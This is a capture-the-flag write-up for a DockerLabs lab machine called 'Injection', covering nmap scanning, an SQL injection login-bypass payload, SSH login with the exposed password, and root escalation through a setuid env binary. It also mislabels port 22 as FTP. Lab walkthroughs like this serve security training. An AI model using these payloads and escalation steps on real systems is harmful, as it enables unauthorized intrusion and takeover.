# Write Up Injection

**Difficulty:** Super fáil<br>
**Link to dockerlabs:** https://dockerlabs.es/

## Setting the enviroment
First of all we deploy the machine with the script that comes when downloading the machine
```
❯ chmod +x auto_deploy.sh
❯ sudo ./auto_deploy.sh injection.tar

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Once deployed, we create the injection folder, go inside and use the *mkt* utility that creates the *nmap*, *content*, *exploits* and *scripts* folders.

```
❯ mkdir injection-dockerlabs
❯ cd injection-dockerlabs
❯ mkt
❯ ls -l
drwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 content
drwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 exploits
drwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 nmap
drwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 scripts
```
## Recon
The first thing that we do is a general reconnaissance with nmap over the victym machine, with the purpose to obtain the open ports.
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
Once we have obtained the open ports we can do an exhaustive scan with recon scripts with the purpose to obtain the services that are running on each port and their's version.

```
❯ extractPorts allPorts
[*] Extracting information...

   [*] IP Address: 172.17.0.2
   [*] Open ports: 22,80

[*] Ports copied to clipboard

❯ nmap -sCV -p22,80 172.17.0.2 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 17:09 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Iniciar Sesi\xC3\xB3n
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds
```

In this way we discovered that the service running on port 22 (FTP port) is OpenSSH 8.9p1 and on port 80 (http port) an Apache httpd 2.4.52 web service is running.

## Exploit
As we have seen that there is a web service running on the victim machine, we proceed to view the web, adding the domain (in this case it does not have one and we will simply put the name of the machine) to the */etc/hosts* file of our virtual machine (it is the local DNS configuration file).

```
❯ sudo vi /etc/hosts
❯ cat /etc/hosts
127.0.0.1   localhost
127.0.1.1   kali

172.17.0.2  injection

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Once the */etc/hosts* file is configured, we proceed to access the website, and we see that it is a login form.

![Web](../.sources/injection-login.png)

Let's try entering the basic parameters to check for SQL injection. To do this, enter the string *admin' OR '1' = '1'; --* in the username section and anything else for password (in my case, I put *hacked!*) to allow the form to be submitted. If everything goes well, you'll be able to log in as the administrator (if it doesn't work with the admin user, you can change it to root, administrator, and similar, but without wasting too much time).

```
User: admin' OR '1' = '1'; --
Password: hacked!
```

And bingo! We're in and we get Dylan's credentials.

```
Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
```

Having obtained these credentials, we can try to access through the also open ssh port.

```
ssh dylan@injection
dylan@injection's password: (aquí ponemos el password)
dylan@6b329dffcb35:~$ 
```

And we alredy get access to the machine!

## Privilege escalation

To be able to use the console in a more comfortable way we can do the following treatment of the terminal:

```
script /dev/null -c bash
stty raw -echo; fg
reset xterm
export TERM=xterm
```

Now that we have a terminal we look for files (preferably binary) with the root user and the *setuid* flag active and we find the following:

```
dylan@6b329dffcb35:/bin$ find / -perm -4000 -user root 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/env
/usr/bin/chsh
```

So we use the env command as follows and elevate privileges to root

```
dylan@6b329dffcb35:/bin$ ./env /bin/sh -p
# whoami
root
# 
```

## Lessons Learned
1. Scans with **nmap**
2. Simple SQL injection
3. Searching for binaries with active *setuid*
4. Privilege escalation with **env**